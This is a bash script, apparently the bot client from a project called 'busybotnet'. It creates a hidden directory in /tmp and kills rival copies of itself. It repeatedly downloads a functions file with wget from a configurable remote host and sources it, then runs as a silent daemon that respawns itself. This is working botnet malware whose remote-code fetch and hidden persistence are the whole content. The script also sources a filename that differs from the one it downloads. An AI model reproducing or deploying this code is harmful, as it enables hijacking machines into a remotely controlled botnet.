#            __   __       			 
#      |\/| /  \ /__` |__| 			 
#      |  | \__X .__/ |  | 	
#		 
##########################################
# https://github.com/isdrupter/busybotnet
##########################################
export mq_version="1.5z" 
# create our enviroment
cwd=$(pwd)
workdir="/tmp/.mqsh"
piddir="${workdir}/pids"
pipe="$workdir/p"
errorlog="$workdir/error.log"
if ([[ `id -u` == "0" ]] || [[ -w /var/run ]]) ; then
  subpidfile="/var/run/sub.pid"
  pidfile="/var/run/mq.pid"
  shpidfile="/var/run/sh.pid"
else
  subpidfile="$workdir/sub.pid"
  pidfile="$workdir/mq.pid"
  shpidfile="/tmp/sh.pid"
fi
if [[ ! -d $workdir ]]; then mkdir $workdir; fi
if [[ ! -d $piddir ]]; then mkdir $piddir ;fi
if [[ ! -f $errorlog ]]; then >$errorlog ;fi
if [[ ! -p $pipe ]]; then mkfifo $pipe ;fi
# children should inherit these for easy api scripting
export mq_host=${1:-"localhost"}
export mq_pass=${2:-"x"}
export mq_path=${3:-"/usr/sbin:/bin:/usr/bin:/sbin:/var/bin"}
export mq_debug=${4:-"0"}
export mq_intf=${5:-"lo"}
export mq_subtop=${6:-"bot"}
export mq_pubtop=${7:-"jsh"}
export mq_httphost=${8:-"localhost"}
export mq_ipthost=${9:-"localhost"}
export mq_binpath=${10:-"/var/bin"}
mq_ip=$(/sbin/ifconfig $mq_intf | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
export mq_ip="$mq_ip"
# Set debug or daemon mode
if [ $mq_debug == "1" ] ; then
  mq_debug=true
else
  mq_debug=false
fi
# find a shell in order of preferance
export PATH=$mq_path
if which bash >/dev/null 2>&1 ; then 
  export shell='bash'
elif which ash >/dev/null 2>&1; then
  export shell='ash'
else
  $mq_debug &&\
  echo 'Warning: resorting to sh, but I depend on some bashisms. Program might be unstable.'
  export shell='sh'
fi
# figure out where to put pidfiles
if ([ -s "$subpidfile" ] && pidof subclient >/dev/null 2>&1) ; then 
  $mq_debug && echo "Will not run a clone, killing clones..."
  kill -15 "$(cat $subpidfile)" >>$errorlog 2>&1
fi
if [ -s $pidfile ]; then 
  if [[ "$(cat $pidfile|tr -d '\n')" != "$$" ]]; then
    $mq_debug && echo 'Pidfile pid is not our pid, so I must be a clone. Killing pid...'
    kill -15 `cat $pidfile` >>$errorlog 2>&1
    echo "$$" >$pidfile
  fi
else
 $mq_debug && echo 'Creating a pidfile since there is not one already ...'
  echo "$$" >$pidfile
fi
# source functions
getConfig(){
while true; do
  $mq_debug && echo "[*] Downloading and sourcing latest configuration..."
  rm -f "$mq_binpath/mq-funx" "$mq_binpath/mq-funx.sha1"
  wget -O "$mq_binpath/mq-funx" "$mq_httphost/mq-funx"
  wget -O "/tmp/mq-funx.sha1" "$mq_httphost/mq-funx.sha1"
  mqhash="$(echo $(cat /tmp/mq-funx.sha1))"
  if (echo $mqhash *$mq_binpath/mq-funx | sha1sum -c -) > /dev/null 2>&1 ; then
     $mq_debug && echo '[*] Hash matches, will source and exec...'
     source "$mq_binpath/mq-funx.sh"
     break
  else
    secs="$(echo $RANDOM|head -c 2)"
    $mq_debug && echo "[!] Invalid checksum, sleeping for $secs seconds"
    sleep $secs
    continue
  fi
done
}

if $mq_debug ;then
  echo "MqSH Version $mq_version----------------------------------------------"
  echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
  echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
  echo "		    \ [[nicid]]	[[subtopic]][[pubtopic]]	     "
  echo "Options:-------------------------------------------------------"
  trap ctrl_c EXIT INT TERM
  while true;do 
    getConfig
    spitSomeBin
    run
    echo "[!] Died or received an update, respawning..."
    sleep 5
  done
else
  export errorlog=/dev/null
  trap "" SIGHUP
  (umask 0
  exec >/dev/null
  exec 2>/dev/null
  exec 0</dev/null
  COUNT=1
  echo "$COUNT `date +%s`" >$workdir/respawns
  while true;do
    getConfig >>$errorlog 2>&1
    spitSomeBin >>$errorlog 2>&1
    doFirst >>$errorlog 2>&1
    run >>$errorlog 2>&1
    let COUNT=COUNT+1
    echo "$COUNT `date +%s`" >>$workdir/respawns
    sleep 5
  done &)&
fi

# vim syntax=bash
